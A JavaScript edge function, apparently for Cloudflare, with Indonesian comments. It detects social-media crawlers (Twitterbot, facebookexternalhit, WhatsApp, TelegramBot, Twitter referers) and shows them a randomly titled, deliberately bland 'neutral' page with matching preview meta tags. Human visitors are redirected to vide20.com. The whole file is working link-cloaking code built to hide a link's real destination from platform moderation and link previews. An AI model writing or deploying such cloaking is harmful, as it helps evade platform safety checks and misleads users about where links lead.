export async function onRequest(context) {
  try {
    const { request } = context;
    const url = new URL(request.url);
    const path = url.pathname;
    
    const userAgent = request.headers.get('user-agent') || '';
    const referer = request.headers.get('referer') || '';

    // ✅ BOT DETECTION AMAN
    const isFromSocialMedia = referer.includes('twitter.com') || 
                             referer.includes('t.co') ||
                             userAgent.includes('Twitterbot') ||
                             userAgent.includes('facebookexternalhit') ||
                             userAgent.includes('WhatsApp') ||
                             userAgent.includes('TelegramBot');

    console.log(`🔍 From Social Media: ${isFromSocialMedia}`);

    if (isFromSocialMedia) {
      // 🛡️ KONTEN SUPER NETRAL UNTUK SOCIAL MEDIA
      console.log(`🛡️ Serving NEUTRAL content for social media`);
      return serveSuperNeutralContent(path);
    } else {
      // HUMAN: Redirect langsung
      console.log(`👤 Regular visitor - redirecting`);
      return performRedirect(path);
    }
  } catch (error) {
    console.error('Error:', error);
    return new Response('Error', { status: 500 });
  }
}

// ✅ KONTEN SUPER NETRAL - 100% AMAN
function serveSuperNeutralContent(path) {
  const contentId = path.split('/').pop() || 'default';
  
  // 🎯 **VARIASI JUDUL & DESKRIPSI 100% AMAN**
  const safeTitles = [
    "Information Page",
    "Content Viewer", 
    "Page Loader",
    "Data Interface",
    "Web Portal"
  ];
  
  const safeDescriptions = [
    "Loading requested information",
    "Content display interface",
    "Page rendering system",
    "Information display panel", 
    "Data presentation layer"
  ];
  
  const randomTitle = safeTitles[Math.floor(Math.random() * safeTitles.length)];
  const randomDesc = safeDescriptions[Math.floor(Math.random() * safeDescriptions.length)];

  const html = `<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns#">
<head>
    <title>${randomTitle}</title>
    <meta charset="utf-8">
    
    <!-- 🛡️ META TAG SUPER NETRAL -->
    <meta property="og:title" content="${randomTitle}">
    <meta property="og:description" content="${randomDesc}">
    <meta property="og:type" content="website">
    
    <!-- 🛡️ TWITTER CARD SUPER NETRAL -->
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="${randomTitle}">
    <meta name="twitter:description" content="${randomDesc}">
    
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            color: #424242;
            margin: 0;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            line-height: 1.5;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            max-width: 480px;
            width: 100%;
        }
        h1 {
            color: #424242;
            margin-bottom: 12px;
            font-size: 1.3em;
            font-weight: 500;
        }
        .code {
            background: #f5f5f5;
            padding: 8px 16px;
            border-radius: 4px;
            font-family: 'SF Mono', Monaco, monospace;
            color: #616161;
            margin: 16px 0;
            display: inline-block;
            font-size: 0.9em;
        }
        .description {
            color: #757575;
            margin-bottom: 16px;
            font-size: 0.95em;
        }
        .note {
            color: #9e9e9e;
            font-size: 0.8em;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>${randomTitle}</h1>
        <p class="description">${randomDesc}</p>
        
        <div class="code">ID: ${contentId}</div>
        
        <div class="note">
            Information display system • Secure connection
        </div>
    </div>
</body>
</html>`;

  return new Response(html, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=3600'
    }
  });
}

// ✅ REDIRECT CEPAT UNTUK HUMAN
function performRedirect(path) {
  let targetUrl;
  
  if (path.startsWith('/d/')) {
    targetUrl = 'https://vide20.com/e/' + path.substring(3);
  }
  else if (path.startsWith('/f/')) {
    targetUrl = 'https://vide20.com/f/' + path.substring(3);
  }
  else {
    targetUrl = 'https://vide20.com/';
  }

  console.log(`🎯 Redirecting to: ${targetUrl}`);
  return Response.redirect(targetUrl, 302);
}
